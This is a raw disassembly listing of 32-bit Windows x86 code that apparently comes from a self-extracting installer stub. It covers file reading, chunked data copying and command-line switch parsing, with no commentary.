  4032a2:	6a 01                	push   $0x1
  4032a4:	e8 b1 fd ff ff       	call   0x40305a
  4032a9:	39 1d 74 9a 42 00    	cmp    %ebx,0x429a74
  4032af:	59                   	pop    %ecx
  4032b0:	0f 84 cb 00 00 00    	je     0x403381
  4032b6:	39 5d f4             	cmp    %ebx,-0xc(%ebp)
  4032b9:	74 2a                	je     0x4032e5
  4032bb:	ff 35 f0 8e 41 00    	push   0x418ef0
  4032c1:	e8 91 03 00 00       	call   0x403657
  4032c6:	8d 45 08             	lea    0x8(%ebp),%eax
  4032c9:	6a 04                	push   $0x4
  4032cb:	50                   	push   %eax
  4032cc:	e8 70 03 00 00       	call   0x403641
  4032d1:	85 c0                	test   %eax,%eax
  4032d3:	0f 84 a8 00 00 00    	je     0x403381
  4032d9:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4032dc:	3b 45 08             	cmp    0x8(%ebp),%eax
  4032df:	0f 85 9c 00 00 00    	jne    0x403381
  4032e5:	ff 75 ec             	push   -0x14(%ebp)
  4032e8:	6a 40                	push   $0x40
  4032ea:	ff 15 10 81 40 00    	call   *0x408110
  4032f0:	b9 68 ce 40 00       	mov    $0x40ce68,%ecx
  4032f5:	8b f0                	mov    %eax,%esi
  4032f7:	e8 2f 39 00 00       	call   0x406c2b
  4032fc:	8d 85 d0 fd ff ff    	lea    -0x230(%ebp),%eax
  403302:	68 00 68 43 00       	push   $0x436800
  403307:	50                   	push   %eax
  403308:	e8 ee 2e 00 00       	call   0x4061fb
  40330d:	53                   	push   %ebx
  40330e:	68 00 01 00 04       	push   $0x4000100
  403313:	6a 02                	push   $0x2
  403315:	53                   	push   %ebx
  403316:	53                   	push   %ebx
  403317:	8d 85 d0 fd ff ff    	lea    -0x230(%ebp),%eax
  40331d:	68 00 00 00 c0       	push   $0xc0000000
  403322:	50                   	push   %eax
  403323:	ff 15 cc 80 40 00    	call   *0x4080cc
  403329:	83 f8 ff             	cmp    $0xffffffff,%eax
  40332c:	a3 1c a0 40 00       	mov    %eax,0x40a01c
  403331:	75 14                	jne    0x403347
  403333:	b8 30 a2 40 00       	mov    $0x40a230,%eax
  403338:	e9 8c 00 00 00       	jmp    0x4033c9
  40333d:	6a 01                	push   $0x1
  40333f:	e8 16 fd ff ff       	call   0x40305a
  403344:	59                   	pop    %ecx
  403345:	eb 3a                	jmp    0x403381
  403347:	a1 74 9a 42 00       	mov    0x429a74,%eax
  40334c:	83 c0 1c             	add    $0x1c,%eax
  40334f:	50                   	push   %eax
  403350:	e8 02 03 00 00       	call   0x403657
  403355:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  403358:	ff 75 ec             	push   -0x14(%ebp)
  40335b:	f7 d1                	not    %ecx
  40335d:	83 e1 04             	and    $0x4,%ecx
  403360:	a3 08 0f 42 00       	mov    %eax,0x420f08
  403365:	2b c1                	sub    %ecx,%eax
  403367:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40336a:	56                   	push   %esi
  40336b:	53                   	push   %ebx
  40336c:	8d 44 08 e4          	lea    -0x1c(%eax,%ecx,1),%eax
  403370:	6a ff                	push   $0xffffffff
  403372:	a3 fc 0e 42 00       	mov    %eax,0x420efc
  403377:	e8 54 00 00 00       	call   0x4033d0
  40337c:	3b 45 ec             	cmp    -0x14(%ebp),%eax
  40337f:	74 07                	je     0x403388
  403381:	b8 98 a0 40 00       	mov    $0x40a098,%eax
  403386:	eb 41                	jmp    0x4033c9
  403388:	f6 45 d8 01          	testb  $0x1,-0x28(%ebp)
  40338c:	89 35 70 9a 42 00    	mov    %esi,0x429a70
  403392:	8b 06                	mov    (%esi),%eax
  403394:	a3 78 9a 42 00       	mov    %eax,0x429a78
  403399:	74 06                	je     0x4033a1
  40339b:	ff 05 7c 9a 42 00    	incl   0x429a7c
  4033a1:	6a 08                	push   $0x8
  4033a3:	8d 46 44             	lea    0x44(%esi),%eax
  4033a6:	59                   	pop    %ecx
  4033a7:	83 e8 08             	sub    $0x8,%eax
  4033aa:	01 30                	add    %esi,(%eax)
  4033ac:	49                   	dec    %ecx
  4033ad:	75 f8                	jne    0x4033a7
  4033af:	a1 f8 0e 42 00       	mov    0x420ef8,%eax
  4033b4:	6a 40                	push   $0x40
  4033b6:	89 46 3c             	mov    %eax,0x3c(%esi)
  4033b9:	83 c6 04             	add    $0x4,%esi
  4033bc:	56                   	push   %esi
  4033bd:	68 80 9a 42 00       	push   $0x429a80
  4033c2:	e8 c0 2d 00 00       	call   0x406187
  4033c7:	33 c0                	xor    %eax,%eax
  4033c9:	5f                   	pop    %edi
  4033ca:	5e                   	pop    %esi
  4033cb:	5b                   	pop    %ebx
  4033cc:	c9                   	leave
  4033cd:	c2 04 00             	ret    $0x4
  4033d0:	55                   	push   %ebp
  4033d1:	8b ec                	mov    %esp,%ebp
  4033d3:	51                   	push   %ecx
  4033d4:	8b 45 08             	mov    0x8(%ebp),%eax
  4033d7:	53                   	push   %ebx
  4033d8:	56                   	push   %esi
  4033d9:	33 f6                	xor    %esi,%esi
  4033db:	3b c6                	cmp    %esi,%eax
  4033dd:	7c 1c                	jl     0x4033fb
  4033df:	8b 0d b8 9a 42 00    	mov    0x429ab8,%ecx
  4033e5:	56                   	push   %esi
  4033e6:	03 c1                	add    %ecx,%eax
  4033e8:	56                   	push   %esi
  4033e9:	50                   	push   %eax
  4033ea:	a3 f8 0e 42 00       	mov    %eax,0x420ef8
  4033ef:	ff 35 1c a0 40 00    	push   0x40a01c
  4033f5:	ff 15 34 81 40 00    	call   *0x408134
  4033fb:	6a 04                	push   $0x4
  4033fd:	e8 d6 00 00 00       	call   0x4034d8
  403402:	3b c6                	cmp    %esi,%eax
  403404:	0f 8c c8 00 00 00    	jl     0x4034d2
  40340a:	8d 45 08             	lea    0x8(%ebp),%eax
  40340d:	6a 04                	push   $0x4
  40340f:	50                   	push   %eax
  403410:	ff 35 1c a0 40 00    	push   0x40a01c
  403416:	e8 34 2e 00 00       	call   0x40624f
  40341b:	85 c0                	test   %eax,%eax
  40341d:	0f 84 9f 00 00 00    	je     0x4034c2
  403423:	ff 75 08             	push   0x8(%ebp)
  403426:	83 05 f8 0e 42 00 04 	addl   $0x4,0x420ef8
  40342d:	e8 a6 00 00 00       	call   0x4034d8
  403432:	8b d8                	mov    %eax,%ebx
  403434:	3b de                	cmp    %esi,%ebx
  403436:	0f 8c 94 00 00 00    	jl     0x4034d0
  40343c:	39 75 10             	cmp    %esi,0x10(%ebp)
  40343f:	75 5d                	jne    0x40349e
  403441:	39 75 08             	cmp    %esi,0x8(%ebp)
  403444:	0f 8e 86 00 00 00    	jle    0x4034d0
  40344a:	be f0 4e 41 00       	mov    $0x414ef0,%esi
  40344f:	81 7d 08 00 40 00 00 	cmpl   $0x4000,0x8(%ebp)
  403456:	8b 45 08             	mov    0x8(%ebp),%eax
  403459:	7c 05                	jl     0x403460
  40345b:	b8 00 40 00 00       	mov    $0x4000,%eax
  403460:	50                   	push   %eax
  403461:	56                   	push   %esi
  403462:	ff 35 1c a0 40 00    	push   0x40a01c
  403468:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40346b:	e8 df 2d 00 00       	call   0x40624f
  403470:	85 c0                	test   %eax,%eax
  403472:	74 4e                	je     0x4034c2
  403474:	ff 75 fc             	push   -0x4(%ebp)
  403477:	56                   	push   %esi
  403478:	ff 75 0c             	push   0xc(%ebp)
  40347b:	e8 fe 2d 00 00       	call   0x40627e
  403480:	85 c0                	test   %eax,%eax
  403482:	74 16                	je     0x40349a
  403484:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403487:	29 45 08             	sub    %eax,0x8(%ebp)
  40348a:	01 05 f8 0e 42 00    	add    %eax,0x420ef8
  403490:	03 d8                	add    %eax,%ebx
  403492:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  403496:	7f b7                	jg     0x40344f
  403498:	eb 36                	jmp    0x4034d0
  40349a:	6a fe                	push   $0xfffffffe
  40349c:	eb 26                	jmp    0x4034c4
  40349e:	8b 45 08             	mov    0x8(%ebp),%eax
  4034a1:	3b 45 14             	cmp    0x14(%ebp),%eax
  4034a4:	7c 03                	jl     0x4034a9
  4034a6:	8b 45 14             	mov    0x14(%ebp),%eax
  4034a9:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  4034ac:	56                   	push   %esi
  4034ad:	51                   	push   %ecx
  4034ae:	50                   	push   %eax
  4034af:	ff 75 10             	push   0x10(%ebp)
  4034b2:	ff 35 1c a0 40 00    	push   0x40a01c
  4034b8:	ff 15 30 81 40 00    	call   *0x408130
  4034be:	85 c0                	test   %eax,%eax
  4034c0:	75 05                	jne    0x4034c7
  4034c2:	6a fd                	push   $0xfffffffd
  4034c4:	58                   	pop    %eax
  4034c5:	eb 0b                	jmp    0x4034d2
  4034c7:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  4034ca:	01 1d f8 0e 42 00    	add    %ebx,0x420ef8
  4034d0:	8b c3                	mov    %ebx,%eax
  4034d2:	5e                   	pop    %esi
  4034d3:	5b                   	pop    %ebx
  4034d4:	c9                   	leave
  4034d5:	c2 10 00             	ret    $0x10
  4034d8:	53                   	push   %ebx
  4034d9:	55                   	push   %ebp
  4034da:	56                   	push   %esi
  4034db:	8b 35 f8 0e 42 00    	mov    0x420ef8,%esi
  4034e1:	2b 35 60 ce 40 00    	sub    0x40ce60,%esi
  4034e7:	57                   	push   %edi
  4034e8:	03 74 24 14          	add    0x14(%esp),%esi
  4034ec:	ff 15 d0 80 40 00    	call   *0x4080d0
  4034f2:	33 db                	xor    %ebx,%ebx
  4034f4:	05 f4 01 00 00       	add    $0x1f4,%eax
  4034f9:	3b f3                	cmp    %ebx,%esi
  4034fb:	a3 6c 9a 42 00       	mov    %eax,0x429a6c
  403500:	0f 8e 2a 01 00 00    	jle    0x403630
  403506:	ff 35 08 0f 42 00    	push   0x420f08
  40350c:	e8 46 01 00 00       	call   0x403657
  403511:	53                   	push   %ebx
  403512:	53                   	push   %ebx
  403513:	ff 35 60 ce 40 00    	push   0x40ce60
  403519:	ff 35 1c a0 40 00    	push   0x40a01c
  40351f:	ff 15 34 81 40 00    	call   *0x408134
  403525:	89 35 04 0f 42 00    	mov    %esi,0x420f04
  40352b:	89 1d f0 8e 41 00    	mov    %ebx,0x418ef0
  403531:	bd f0 ce 40 00       	mov    $0x40cef0,%ebp
  403536:	a1 fc 0e 42 00       	mov    0x420efc,%eax
  40353b:	bf 00 40 00 00       	mov    $0x4000,%edi
  403540:	2b 05 08 0f 42 00    	sub    0x420f08,%eax
  403546:	3b c7                	cmp    %edi,%eax
  403548:	7f 02                	jg     0x40354c
  40354a:	8b f8                	mov    %eax,%edi
  40354c:	be f0 4e 41 00       	mov    $0x414ef0,%esi
  403551:	57                   	push   %edi
  403552:	56                   	push   %esi
  403553:	e8 e9 00 00 00       	call   0x403641
  403558:	85 c0                	test   %eax,%eax
  40355a:	0f 84 c2 00 00 00    	je     0x403622
  403560:	01 3d 08 0f 42 00    	add    %edi,0x420f08
  403566:	89 35 80 ce 40 00    	mov    %esi,0x40ce80
  40356c:	89 3d 84 ce 40 00    	mov    %edi,0x40ce84
  403572:	39 1d 70 9a 42 00    	cmp    %ebx,0x429a70
  403578:	74 29                	je     0x4035a3
  40357a:	39 1d 00 9b 42 00    	cmp    %ebx,0x429b00
  403580:	75 21                	jne    0x4035a3
  403582:	a1 04 0f 42 00       	mov    0x420f04,%eax
  403587:	53                   	push   %ebx
  403588:	2b 05 f8 0e 42 00    	sub    0x420ef8,%eax
  40358e:	2b 44 24 18          	sub    0x18(%esp),%eax
  403592:	03 05 60 ce 40 00    	add    0x40ce60,%eax
  403598:	a3 f0 8e 41 00       	mov    %eax,0x418ef0
  40359d:	e8 b8 fa ff ff       	call   0x40305a
  4035a2:	59                   	pop    %ecx
  4035a3:	b9 68 ce 40 00       	mov    $0x40ce68,%ecx
  4035a8:	89 2d 88 ce 40 00    	mov    %ebp,0x40ce88
  4035ae:	c7 05 8c ce 40 00 00 	movl   $0x8000,0x40ce8c
  4035b5:	80 00 00 
  4035b8:	e8 8e 36 00 00       	call   0x406c4b
  4035bd:	85 c0                	test   %eax,%eax
  4035bf:	7c 6a                	jl     0x40362b
  4035c1:	8b 35 88 ce 40 00    	mov    0x40ce88,%esi
  4035c7:	2b f5                	sub    %ebp,%esi
  4035c9:	74 21                	je     0x4035ec
  4035cb:	56                   	push   %esi
  4035cc:	55                   	push   %ebp
  4035cd:	ff 35 1c a0 40 00    	push   0x40a01c
  4035d3:	e8 a6 2c 00 00       	call   0x40627e
  4035d8:	85 c0                	test   %eax,%eax
  4035da:	74 4b                	je     0x403627
  4035dc:	01 35 60 ce 40 00    	add    %esi,0x40ce60
  4035e2:	39 1d 84 ce 40 00    	cmp    %ebx,0x40ce84
  4035e8:	75 88                	jne    0x403572
  4035ea:	eb 0c                	jmp    0x4035f8
  4035ec:	39 1d 84 ce 40 00    	cmp    %ebx,0x40ce84
  4035f2:	75 37                	jne    0x40362b
  4035f4:	3b fb                	cmp    %ebx,%edi
  4035f6:	74 33                	je     0x40362b
  4035f8:	a1 f8 0e 42 00       	mov    0x420ef8,%eax
  4035fd:	8b c8                	mov    %eax,%ecx
  4035ff:	2b 0d 60 ce 40 00    	sub    0x40ce60,%ecx
  403605:	03 4c 24 14          	add    0x14(%esp),%ecx
  403609:	85 c9                	test   %ecx,%ecx
  40360b:	0f 8f 25 ff ff ff    	jg     0x403536
  403611:	53                   	push   %ebx
  403612:	53                   	push   %ebx
  403613:	50                   	push   %eax
  403614:	ff 35 1c a0 40 00    	push   0x40a01c
  40361a:	ff 15 34 81 40 00    	call   *0x408134
  403620:	eb 0e                	jmp    0x403630
  403622:	83 c8 ff             	or     $0xffffffff,%eax
  403625:	eb 13                	jmp    0x40363a
  403627:	6a fe                	push   $0xfffffffe
  403629:	eb 02                	jmp    0x40362d
  40362b:	6a fd                	push   $0xfffffffd
  40362d:	58                   	pop    %eax
  40362e:	eb 0a                	jmp    0x40363a
  403630:	6a 01                	push   $0x1
  403632:	e8 23 fa ff ff       	call   0x40305a
  403637:	59                   	pop    %ecx
  403638:	33 c0                	xor    %eax,%eax
  40363a:	5f                   	pop    %edi
  40363b:	5e                   	pop    %esi
  40363c:	5d                   	pop    %ebp
  40363d:	5b                   	pop    %ebx
  40363e:	c2 04 00             	ret    $0x4
  403641:	ff 74 24 08          	push   0x8(%esp)
  403645:	ff 74 24 08          	push   0x8(%esp)
  403649:	ff 35 18 a0 40 00    	push   0x40a018
  40364f:	e8 fb 2b 00 00       	call   0x40624f
  403654:	c2 08 00             	ret    $0x8
  403657:	6a 00                	push   $0x0
  403659:	6a 00                	push   $0x0
  40365b:	ff 74 24 0c          	push   0xc(%esp)
  40365f:	ff 35 18 a0 40 00    	push   0x40a018
  403665:	ff 15 34 81 40 00    	call   *0x408134
  40366b:	c2 04 00             	ret    $0x4
  40366e:	56                   	push   %esi
  40366f:	be 00 68 43 00       	mov    $0x436800,%esi
  403674:	56                   	push   %esi
  403675:	e8 10 33 00 00       	call   0x40698a
  40367a:	56                   	push   %esi
  40367b:	e8 a2 29 00 00       	call   0x406022
  403680:	85 c0                	test   %eax,%eax
  403682:	75 02                	jne    0x403686
  403684:	5e                   	pop    %esi
  403685:	c3                   	ret
  403686:	56                   	push   %esi
  403687:	e8 1f 29 00 00       	call   0x405fab
  40368c:	56                   	push   %esi
  40368d:	e8 f8 25 00 00       	call   0x405c8a
  403692:	56                   	push   %esi
  403693:	68 00 60 43 00       	push   $0x436000
  403698:	e8 5e 2b 00 00       	call   0x4061fb
  40369d:	5e                   	pop    %esi
  40369e:	c3                   	ret
  40369f:	81 ec f8 03 00 00    	sub    $0x3f8,%esp
  4036a5:	55                   	push   %ebp
  4036a6:	56                   	push   %esi
  4036a7:	57                   	push   %edi
  4036a8:	6a 20                	push   $0x20
  4036aa:	5f                   	pop    %edi
  4036ab:	33 ed                	xor    %ebp,%ebp
  4036ad:	68 01 80 00 00       	push   $0x8001
  4036b2:	89 6c 24 20          	mov    %ebp,0x20(%esp)
  4036b6:	c7 44 24 18 30 a2 40 	movl   $0x40a230,0x18(%esp)
  4036bd:	00 
  4036be:	89 6c 24 14          	mov    %ebp,0x14(%esp)
  4036c2:	ff 15 9c 80 40 00    	call   *0x40809c
  4036c8:	8b 35 a0 80 40 00    	mov    0x4080a0,%esi
  4036ce:	8d 44 24 34          	lea    0x34(%esp),%eax
  4036d2:	50                   	push   %eax
  4036d3:	89 6c 24 4c          	mov    %ebp,0x4c(%esp)
  4036d7:	89 ac 24 4c 01 00 00 	mov    %ebp,0x14c(%esp)
  4036de:	89 ac 24 50 01 00 00 	mov    %ebp,0x150(%esp)
  4036e5:	c7 44 24 38 1c 01 00 	movl   $0x11c,0x38(%esp)
  4036ec:	00 
  4036ed:	ff d6                	call   *%esi
  4036ef:	85 c0                	test   %eax,%eax
  4036f1:	75 38                	jne    0x40372b
  4036f3:	8d 44 24 34          	lea    0x34(%esp),%eax
  4036f7:	c7 44 24 34 14 01 00 	movl   $0x114,0x34(%esp)
  4036fe:	00 
  4036ff:	50                   	push   %eax
  403700:	ff d6                	call   *%esi
  403702:	66 8b 44 24 48       	mov    0x48(%esp),%ax
  403707:	8b 4c 24 62          	mov    0x62(%esp),%ecx
  40370b:	66 2d 53 00          	sub    $0x53,%ax
  40370f:	83 c1 d0             	add    $0xffffffd0,%ecx
  403712:	66 f7 d8             	neg    %ax
  403715:	1b c0                	sbb    %eax,%eax
  403717:	c6 84 24 4e 01 00 00 	movb   $0x4,0x14e(%esp)
  40371e:	04 
  40371f:	f7 d0                	not    %eax
  403721:	23 c1                	and    %ecx,%eax
  403723:	66 89 84 24 48 01 00 	mov    %ax,0x148(%esp)
  40372a:	00 
  40372b:	83 7c 24 38 0a       	cmpl   $0xa,0x38(%esp)
  403730:	73 06                	jae    0x403738
  403732:	66 83 64 24 42 00    	andw   $0x0,0x42(%esp)
  403738:	8b 44 24 40          	mov    0x40(%esp),%eax
  40373c:	0f b6 4c 24 3c       	movzbl 0x3c(%esp),%ecx
  403741:	a3 18 9b 42 00       	mov    %eax,0x429b18
  403746:	33 c0                	xor    %eax,%eax
  403748:	8a 64 24 38          	mov    0x38(%esp),%ah
  40374c:	0f b7 c0             	movzwl %ax,%eax
  40374f:	0b c1                	or     %ecx,%eax
  403751:	33 c9                	xor    %ecx,%ecx
  403753:	8a ac 24 48 01 00 00 	mov    0x148(%esp),%ch
  40375a:	0f b7 c9             	movzwl %cx,%ecx
  40375d:	c1 e0 10             	shl    $0x10,%eax
  403760:	0b c1                	or     %ecx,%eax
  403762:	0f b6 8c 24 4e 01 00 	movzbl 0x14e(%esp),%ecx
  403769:	00 
  40376a:	0b c1                	or     %ecx,%eax
  40376c:	a3 1c 9b 42 00       	mov    %eax,0x429b1c
  403771:	66 81 3d 1e 9b 42 00 	cmpw   $0x600,0x429b1e
  403778:	00 06 
  40377a:	74 11                	je     0x40378d
  40377c:	55                   	push   %ebp
  40377d:	e8 4e 33 00 00       	call   0x406ad0
  403782:	3b c5                	cmp    %ebp,%eax
  403784:	74 07                	je     0x40378d
  403786:	68 00 0c 00 00       	push   $0xc00
  40378b:	ff d0                	call   *%eax
  40378d:	be a8 82 40 00       	mov    $0x4082a8,%esi
  403792:	56                   	push   %esi
  403793:	e8 c8 32 00 00       	call   0x406a60
  403798:	56                   	push   %esi
  403799:	ff 15 28 81 40 00    	call   *0x408128
  40379f:	8d 74 06 01          	lea    0x1(%esi,%eax,1),%esi
  4037a3:	80 3e 00             	cmpb   $0x0,(%esi)
  4037a6:	75 ea                	jne    0x403792
  4037a8:	6a 0c                	push   $0xc
  4037aa:	e8 21 33 00 00       	call   0x406ad0
  4037af:	6a 0a                	push   $0xa
  4037b1:	e8 1a 33 00 00       	call   0x406ad0
  4037b6:	6a 08                	push   $0x8
  4037b8:	a3 64 9a 42 00       	mov    %eax,0x429a64
  4037bd:	e8 0e 33 00 00       	call   0x406ad0
  4037c2:	3b c5                	cmp    %ebp,%eax
  4037c4:	74 0f                	je     0x4037d5
  4037c6:	6a 1e                	push   $0x1e
  4037c8:	ff d0                	call   *%eax
  4037ca:	85 c0                	test   %eax,%eax
  4037cc:	74 07                	je     0x4037d5
  4037ce:	80 0d 1c 9b 42 00 80 	orb    $0x80,0x429b1c
  4037d5:	53                   	push   %ebx
  4037d6:	ff 15 38 80 40 00    	call   *0x408038
  4037dc:	55                   	push   %ebp
  4037dd:	ff 15 98 82 40 00    	call   *0x408298
  4037e3:	a3 20 9b 42 00       	mov    %eax,0x429b20
  4037e8:	55                   	push   %ebp
  4037e9:	8d 84 24 58 01 00 00 	lea    0x158(%esp),%eax
  4037f0:	68 b4 02 00 00       	push   $0x2b4
  4037f5:	50                   	push   %eax
  4037f6:	55                   	push   %ebp
  4037f7:	68 0c 0f 42 00       	push   $0x420f0c
  4037fc:	ff 15 7c 81 40 00    	call   *0x40817c
  403802:	68 78 a3 40 00       	push   $0x40a378
  403807:	68 60 8a 42 00       	push   $0x428a60
  40380c:	e8 cb 2e 00 00       	call   0x4066dc
  403811:	ff 15 a4 80 40 00    	call   *0x4080a4
  403817:	bb 00 40 43 00       	mov    $0x434000,%ebx
  40381c:	50                   	push   %eax
  40381d:	53                   	push   %ebx
  40381e:	e8 b9 2e 00 00       	call   0x4066dc
  403823:	6a 22                	push   $0x22
  403825:	c7 05 60 9a 42 00 00 	movl   $0x400000,0x429a60
  40382c:	00 40 00 
  40382f:	5e                   	pop    %esi
  403830:	8b c3                	mov    %ebx,%eax
  403832:	66 39 35 00 40 43 00 	cmp    %si,0x434000
  403839:	75 07                	jne    0x403842
  40383b:	8b fe                	mov    %esi,%edi
  40383d:	b8 02 40 43 00       	mov    $0x434002,%eax
  403842:	57                   	push   %edi
  403843:	50                   	push   %eax
  403844:	e8 8f 27 00 00       	call   0x405fd8
  403849:	50                   	push   %eax
  40384a:	ff 15 08 82 40 00    	call   *0x408208
  403850:	8b c8                	mov    %eax,%ecx
  403852:	89 4c 24 1c          	mov    %ecx,0x1c(%esp)
  403856:	e9 f6 00 00 00       	jmp    0x403951
  40385b:	6a 20                	push   $0x20
  40385d:	5a                   	pop    %edx
  40385e:	66 3b c2             	cmp    %dx,%ax
  403861:	75 07                	jne    0x40386a
  403863:	41                   	inc    %ecx
  403864:	41                   	inc    %ecx
  403865:	66 39 11             	cmp    %dx,(%ecx)
  403868:	74 f9                	je     0x403863
  40386a:	66 39 31             	cmp    %si,(%ecx)
  40386d:	89 54 24 10          	mov    %edx,0x10(%esp)
  403871:	75 06                	jne    0x403879
  403873:	41                   	inc    %ecx
  403874:	89 74 24 10          	mov    %esi,0x10(%esp)
  403878:	41                   	inc    %ecx
  403879:	66 83 39 2f          	cmpw   $0x2f,(%ecx)
  40387d:	0f 85 bb 00 00 00    	jne    0x40393e
  403883:	41                   	inc    %ecx
  403884:	41                   	inc    %ecx
  403885:	66 83 39 53          	cmpw   $0x53,(%ecx)
  403889:	75 18                	jne    0x4038a3
  40388b:	66 8b 41 02          	mov    0x2(%ecx),%ax
  40388f:	66 3b c2             	cmp    %dx,%ax
  403892:	74 05                	je     0x403899
  403894:	66 3b c5             	cmp    %bp,%ax
  403897:	75 0a                	jne    0x4038a3
  403899:	c7 05 00 9b 42 00 01 	movl   $0x1,0x429b00
  4038a0:	00 00 00 
  4038a3:	0f b7 05 72 a3 40 00 	movzwl 0x40a372,%eax
  4038aa:	99                   	cltd
  4038ab:	0f a4 c2 10          	shld   $0x10,%eax,%edx
  4038af:	c1 e0 10             	shl    $0x10,%eax
  4038b2:	8b f8                	mov    %eax,%edi
  4038b4:	33 f6                	xor    %esi,%esi
  4038b6:	0f b7 05 70 a3 40 00 	movzwl 0x40a370,%eax
  4038bd:	99                   	cltd
  4038be:	0f b7 15 6c a3 40 00 	movzwl 0x40a36c,%edx
  4038c5:	0b f8                	or     %eax,%edi
  4038c7:	0f b7 05 6e a3 40 00 	movzwl 0x40a36e,%eax
  4038ce:	c1 e0 10             	shl    $0x10,%eax
  4038d1:	0b c2                	or     %edx,%eax
  4038d3:	99                   	cltd
  4038d4:	0b f0                	or     %eax,%esi
  4038d6:	8b 01                	mov    (%ecx),%eax
  4038d8:	0b fa                	or     %edx,%edi
  4038da:	3b c6                	cmp    %esi,%eax
  4038dc:	75 1b                	jne    0x4038f9
  4038de:	8b 41 04             	mov    0x4(%ecx),%eax
  4038e1:	3b c7                	cmp    %edi,%eax
  4038e3:	75 14                	jne    0x4038f9
  4038e5:	66 8b 41 08          	mov    0x8(%ecx),%ax
  4038e9:	66 3d 20 00          	cmp    $0x20,%ax
  4038ed:	74 05                	je     0x4038f4
  4038ef:	66 3b c5             	cmp    %bp,%ax
  4038f2:	75 05                	jne    0x4038f9
  4038f4:	83 4c 24 14 04       	orl    $0x4,0x14(%esp)
  4038f9:	0f b7 05 66 a3 40 00 	movzwl 0x40a366,%eax
  403900:	99                   	cltd
  403901:	0f a4 c2 10          	shld   $0x10,%eax,%edx
  403905:	c1 e0 10             	shl    $0x10,%eax
  403908:	8b f8                	mov    %eax,%edi
  40390a:	33 f6                	xor    %esi,%esi
  40390c:	0f b7 05 64 a3 40 00 	movzwl 0x40a364,%eax
  403913:	99                   	cltd
  403914:	0f b7 15 60 a3 40 00 	movzwl 0x40a360,%edx
  40391b:	0b f8                	or     %eax,%edi
  40391d:	0f b7 05 62 a3 40 00 	movzwl 0x40a362,%eax
  403924:	c1 e0 10             	shl    $0x10,%eax
  403927:	0b c2                	or     %edx,%eax
  403929:	99                   	cltd
  40392a:	0b f0                	or     %eax,%esi
  40392c:	8b 41 fc             	mov    -0x4(%ecx),%eax
  40392f:	0b fa                	or     %edx,%edi
  403931:	3b c6                	cmp    %esi,%eax
  403933:	75 06                	jne    0x40393b
  403935:	8b 01                	mov    (%ecx),%eax
  403937:	3b c7                	cmp    %edi,%eax
  403939:	74 24                	je     0x40395f
  40393b:	6a 22                	push   $0x22
  40393d:	5e                   	pop    %esi
  40393e:	ff 74 24 10          	push   0x10(%esp)
  403942:	51                   	push   %ecx
  403943:	e8 90 26 00 00       	call   0x405fd8
  403948:	8b c8                	mov    %eax,%ecx
  40394a:	66 39 31             	cmp    %si,(%ecx)
  40394d:	75 02                	jne    0x403951
  40394f:	41                   	inc    %ecx
  403950:	41                   	inc    %ecx
  403951:	66 8b 01             	mov    (%ecx),%ax
  403954:	66 3b c5             	cmp    %bp,%ax
  403957:	0f 85 fe fe ff ff    	jne    0x40385b
  40395d:	eb 12                	jmp    0x403971
  40395f:	66 89 69 fc          	mov    %bp,-0x4(%ecx)
  403963:	83 c1 04             	add    $0x4,%ecx
  403966:	51                   	push   %ecx
  403967:	68 00 48 43 00       	push   $0x434800
  40396c:	e8 6b 2d 00 00       	call   0x4066dc
  403971:	8b 3d a8 80 40 00    	mov    0x4080a8,%edi
  403977:	be 00 68 43 00       	mov    $0x436800,%esi
  40397c:	56                   	push   %esi
  40397d:	68 00 04 00 00       	push   $0x400
  403982:	ff d7                	call   *%edi
  403984:	e8 e5 fc ff ff       	call   0x40366e
  403989:	85 c0                	test   %eax,%eax
  40398b:	75 56                	jne    0x4039e3
  40398d:	68 fb 03 00 00       	push   $0x3fb
  403992:	56                   	push   %esi
  403993:	ff 15 ac 80 40 00    	call   *0x4080ac
  403999:	68 54 a3 40 00       	push   $0x40a354
  40399e:	56                   	push   %esi
  40399f:	e8 54 2d 00 00       	call   0x4066f8
  4039a4:	e8 c5 fc ff ff       	call   0x40366e
  4039a9:	85 c0                	test   %eax,%eax
  4039ab:	75 36                	jne    0x4039e3
  4039ad:	56                   	push   %esi
  4039ae:	68 fc 03 00 00       	push   $0x3fc
  4039b3:	ff d7                	call   *%edi
  4039b5:	68 4c a3 40 00       	push   $0x40a34c
  4039ba:	56                   	push   %esi
  4039bb:	e8 38 2d 00 00       	call   0x4066f8
  4039c0:	8b 3d b0 80 40 00    	mov    0x4080b0,%edi
  4039c6:	56                   	push   %esi
  4039c7:	68 40 a3 40 00       	push   $0x40a340
  4039cc:	ff d7                	call   *%edi
  4039ce:	56                   	push   %esi
  4039cf:	68 38 a3 40 00       	push   $0x40a338
  4039d4:	ff d7                	call   *%edi
  4039d6:	e8 93 fc ff ff       	call   0x40366e
  4039db:	85 c0                	test   %eax,%eax
  4039dd:	0f 84 07 02 00 00    	je     0x403bea
  4039e3:	68 00 60 43 00       	push   $0x436000
  4039e8:	ff 15 44 81 40 00    	call   *0x408144
  4039ee:	ff 74 24 14          	push   0x14(%esp)
  4039f2:	e8 05 f7 ff ff       	call   0x4030fc
  4039f7:	3b c5                	cmp    %ebp,%eax
  4039f9:	89 44 24 18          	mov    %eax,0x18(%esp)
  4039fd:	0f 85 e7 01 00 00    	jne    0x403bea
  403a03:	39 2d 7c 9a 42 00    	cmp    %ebp,0x429a7c
  403a09:	0f 84 93 00 00 00    	je     0x403aa2
  403a0f:	55                   	push   %ebp
  403a10:	53                   	push   %ebx
  403a11:	e8 c2 25 00 00       	call   0x405fd8
  403a16:	8b f8                	mov    %eax,%edi
  403a18:	3b fb                	cmp    %ebx,%edi
  403a1a:	72 4c                	jb     0x403a68
  403a1c:	0f b7 05 32 a3 40 00 	movzwl 0x40a332,%eax
  403a23:	99                   	cltd
  403a24:	0f a4 c2 10          	shld   $0x10,%eax,%edx
  403a28:	c1 e0 10             	shl    $0x10,%eax
  403a2b:	8b e8                	mov    %eax,%ebp
  403a2d:	0f b7 05 30 a3 40 00 	movzwl 0x40a330,%eax
  403a34:	0f b7 0d 2c a3 40 00 	movzwl 0x40a32c,%ecx
  403a3b:	99                   	cltd
  403a3c:	0b e8                	or     %eax,%ebp
